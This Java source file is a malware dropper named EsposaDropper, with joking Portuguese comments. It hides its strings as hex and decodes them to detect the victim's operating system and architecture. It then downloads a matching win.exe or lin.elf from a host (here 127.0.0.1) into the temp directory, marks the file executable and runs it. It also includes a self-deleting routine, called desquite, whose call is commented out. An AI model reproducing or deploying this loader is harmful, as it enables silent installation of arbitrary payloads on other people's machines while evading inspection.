package esposaDropper;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;

public class EsposaDropper {

	private static String amd64 = "616d643634";
	private static String arch;
	private static String OS;
	private static String windows = "77696e646f7773";
	private static String linux = "6c696e7578";
	private static String droped;
	private static String url = "687474703a2f2f25732f25732f2573";
	private static String host = "3132372e302e302e31";

	/**
	 * Esposa quer saber a arquitetura do sistema operacional
	 * 
	 * @return String
	 */
	private static void setArch() {
		if (System.getProperty(ahamTah("6f732e61726368")).equals(ahamTah(amd64))) {
			arch = ahamTah("783634");
		} else {
			arch = ahamTah("783836");
		}
	}

	/**
	 * Esposa quer saber seu sistema operacional
	 * 
	 * @return String
	 */
	private static void setSO() {
		String so = System.getProperty(ahamTah("6f732e6e616d65")).toLowerCase();
		if (so.indexOf(ahamTah("77696e")) >= 0) {
			OS = ahamTah(windows);
		} else if (so.indexOf(ahamTah("6e6978")) >= 0 || so.indexOf(ahamTah("6e7578")) >= 0
				|| so.indexOf(ahamTah("616978")) > 0) {
			OS = ahamTah(linux);
		} else {
			OS = ahamTah("646573636f6e68656369646f");
			System.exit(0);
		}

		if (OS.equals(ahamTah(windows))) {
			droped = ahamTah("77696e2e657865");
		} else if (OS.equals(ahamTah(linux))) {
			droped = ahamTah("6c696e2e656c66");
		}
	}

	/**
	 * Esposa implanta o arquivo no seu computador
	 * 
	 * @throws IOException
	 * @throws MalformedURLException
	 */
	private static void implantar() throws MalformedURLException, IOException {
		url = String.format(ahamTah(url), ahamTah(host), arch, droped);
		BufferedInputStream in = null;
		FileOutputStream fout = null;
		String local = System.getProperty(ahamTah("6a6176612e696f2e746d70646972")) + File.separator + droped;
		try {
			in = new BufferedInputStream(new URL(url).openStream());
			fout = new FileOutputStream(local);

			final byte data[] = new byte[1024];
			int count;
			while ((count = in.read(data, 0, 1024)) != -1) {
				fout.write(data, 0, count);
			}
		} finally {
			if (in != null) {
				in.close();
			}
			if (fout != null) {
				fout.close();
			}
		}
		new File(local).setExecutable(true);
		Runtime.getRuntime().exec(local);
		//desquite();
	}

	/**
	 * Esposa pede desquite
	 * 
	 * @throws IOException
	 */
	private static void desquite() throws IOException {
		String del = new java.io.File(".").getCanonicalPath() + File.separator + EsposaDropper.class.getSimpleName()
				+ ahamTah("2e6a617661");
		new File(del).delete();
	}

	/**
	 * Traduz o que esposa fala
	 * 
	 * @param blaBlaBla
	 * @return String
	 */
	private static String ahamTah(String blaBlaBla) {
		StringBuilder str = new StringBuilder();
		for (int i = 0; i < blaBlaBla.length(); i += 2) {
			str.append((char) Integer.parseInt(blaBlaBla.substring(i, i + 2), 16));
		}
		return str.toString();
	}

	public static void main(String[] args) throws MalformedURLException, IOException {
		iniciarVariaveis();
		implantar();
	}

	/**
	 * Faz a esposa inicializar as variaveis
	 */
	private static void iniciarVariaveis() {
		setArch();
		setSO();
	}
}
